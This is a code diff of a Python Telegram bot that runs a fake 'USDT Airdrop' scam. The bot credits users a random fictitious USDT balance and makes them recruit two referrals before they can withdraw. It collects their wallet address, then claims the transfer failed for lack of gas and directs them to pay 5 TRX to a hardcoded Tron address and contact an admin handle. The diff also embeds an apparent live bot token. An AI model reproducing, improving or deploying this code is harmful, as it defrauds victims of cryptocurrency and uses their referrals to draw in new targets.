@@ -2,79 +2,92 @@ import telebot
 import random
 from telebot import types
 
-TOKEN = "7927183325:AAFWcS1ECBQU5CHkr2riVF4Y0e8SjY03_7M"
-GROUP_LINK = "https://t.me/Verifiedupiloot"
-TRX_ADDRESS = "TAiQJFMpuHcXzek9TBE4ciLevgpe31TPgN"
-ADMIN_ID = 7478723634  # @Julu789
+bot = telebot.TeleBot("7927183325:AAFWcS1ECBQU5CHkr2riVF4Y0e8SjY03_7M")
 
-bot = telebot.TeleBot(TOKEN)
 user_data = {}
 referrals = {}
+rewarded = {}
+
+MIN_REFS = 2
+
+def get_ref_link(user_id):
+    return f"https://t.me/USDT_airdrop_bot?start={user_id}"
 
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
     args = message.text.split()
-    ref_by = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
-
-    if user_id not in user_data:
-        user_data[user_id] = {
-            "joined": False, "reward": 0, "ref_by": ref_by,
-            "refs": [], "wallet": "", "step": ""
-        }
-        if ref_by and ref_by != user_id:
-            referrals.setdefault(ref_by, []).append(user_id)
-
+    
+    if user_id not in referrals:
+        referrals[user_id] = []
+    
+    if len(args) > 1:
+        referrer = int(args[1])
+        if referrer != user_id and user_id not in referrals.get(referrer, []):
+            referrals.setdefault(referrer, []).append(user_id)
+    
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("👉 Join Group", url=GROUP_LINK))
-    markup.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
-    bot.send_message(user_id, "🎁 Welcome to USDT Airdrop!\nJoin our group to continue:", reply_markup=markup)
+    btn = types.InlineKeyboardButton("✅ Join Group", url="https://t.me/Verifiedupiloot")
+    verify_btn = types.InlineKeyboardButton("👉 Verify", callback_data="verify")
+    markup.add(btn)
+    markup.add(verify_btn)
+    
+    bot.send_message(user_id, "👋 Welcome to USDT Airdrop Bot!\n\n🎁 Join the group to claim free USDT.", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "verify")
 def verify(call):
     user_id = call.from_user.id
-    if user_data[user_id]["joined"]:
-        bot.answer_callback_query(call.id, "✅ Already Verified!")
-        return
+    if user_id not in rewarded:
+        usdt = random.randint(199, 233)
+        user_data[user_id] = {'usdt': usdt, 'wallet': '', 'refs': 0}
+        rewarded[user_id] = True
 
-    user_data[user_id]["joined"] = True
-    reward = random.randint(199, 233)
-    user_data[user_id]["reward"] = reward
+        markup = types.InlineKeyboardMarkup()
+        withdraw = types.InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")
+        markup.add(withdraw)
 
-    bot.send_message(user_id, f"🎉 You received {reward} USDT successfully.")
-    bot.send_message(ADMIN_ID, f"✅ @{call.from_user.username} ({user_id}) joined and got {reward} USDT.")
-
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("💸 Withdraw")
-    bot.send_message(user_id, "Choose an option:", reply_markup=markup)
-
-@bot.message_handler(func=lambda msg: msg.text == "💸 Withdraw")
-def withdraw(msg):
-    user_id = msg.from_user.id
-    refs = referrals.get(user_id, [])
-    if len(refs) < 2:
-        link = f"https://t.me/MyCryptoAirdropBot?start={user_id}"  # CHANGE HERE
-        bot.send_message(user_id, f"❗ Refer 2 users first.\n\n🔗 Your referral link:\n{link}")
+        bot.send_message(user_id, f"🎉 You received **{usdt} USDT**!\n\nInvite 2 friends to withdraw.", parse_mode='Markdown', reply_markup=markup)
     else:
-        bot.send_message(user_id, "💼 Enter your USDT (TRC20) Wallet Address:")
-        user_data[user_id]["step"] = "wallet"
+        bot.answer_callback_query(call.id, "✅ Already verified!")
 
-@bot.message_handler(func=lambda msg: user_data.get(msg.from_user.id, {}).get("step") == "wallet")
-def get_wallet(msg):
-    user_id = msg.from_user.id
-    user_data[user_id]["wallet"] = msg.text
-    user_data[user_id]["step"] = "withdraw_amount"
-    bot.send_message(user_id, "💰 How much USDT do you want to withdraw?")
+@bot.callback_query_handler(func=lambda call: call.data == "withdraw")
+def withdraw(call):
+    user_id = call.from_user.id
+    refs = len(referrals.get(user_id, []))
+    if refs < MIN_REFS:
+        bot.send_message(user_id, f"❌ You need at least {MIN_REFS} referrals.\n\nYour referral link:\n{get_ref_link(user_id)}")
+    else:
+        msg = bot.send_message(user_id, "🔐 Send your *USDT TRC20 wallet address*:", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, get_wallet)
 
-@bot.message_handler(func=lambda msg: user_data.get(msg.from_user.id, {}).get("step") == "withdraw_amount")
-def ask_amount(msg):
-    user_id = msg.from_user.id
-    amount = msg.text
-    user_data[user_id]["step"] = ""
+def get_wallet(message):
+    user_id = message.from_user.id
+    user_data[user_id]['wallet'] = message.text
+    msg = bot.send_message(user_id, "💰 Enter amount to withdraw:")
+    bot.register_next_step_handler(msg, confirm_withdraw)
 
-    bot.send_message(user_id, f"🪙 Balance: {user_data[user_id]['reward']} USDT")
-    bot.send_message(user_id, f"❌ Transfer Failed!\nInsufficient Gas Fee.\n\n⚠️ Send 5 TRX to:\n\n`{TRX_ADDRESS}`", parse_mode='Markdown')
+def confirm_withdraw(message):
+    user_id = message.from_user.id
+    try:
+        amount = float(message.text)
+        balance = user_data[user_id]['usdt']
+        if amount > balance:
+            bot.send_message(user_id, f"❌ You only have {balance} USDT.")
+        else:
+            user_data[user_id]['usdt'] -= amount
+            markup = types.InlineKeyboardMarkup()
+            btn = types.InlineKeyboardButton("🔄 Transfer", callback_data="transfer_now")
+            markup.add(btn)
+            bot.send_message(user_id, f"✅ {amount} USDT added to your wallet!\n\nBalance: {user_data[user_id]['usdt']} USDT", reply_markup=markup)
+    except:
+        bot.send_message(user_id, "❌ Invalid amount.")
 
-    bot.send_message(ADMIN_ID, f"💸 Withdraw Request:\nUser: @{msg.from_user.username} ({user_id})\nAmount: {amount} USDT\nWallet: {user_data[user_id]['wallet']}")
+@bot.callback_query_handler(func=lambda call: call.data == "transfer_now")
+def gas_fee_popup(call):
+    markup = types.InlineKeyboardMarkup()
+    pay_btn = types.InlineKeyboardButton("🚀 Pay 5 TRX Gas Fee", url="https://tronscan.org/#/address/TAiQJFMpuHcXzek9TBE4ciLevgpe31TPgN")
+    markup.add(pay_btn)
+    bot.send_message(call.from_user.id, "⚠️ *Insufficient Gas Fee!*\n\nTo complete this transfer, deposit *5 TRX* to cover network fees.", parse_mode='Markdown', reply_markup=markup)
+    bot.send_message(call.from_user.id, f"📩 After payment, contact admin: @Julu789")
 
 bot.polling()
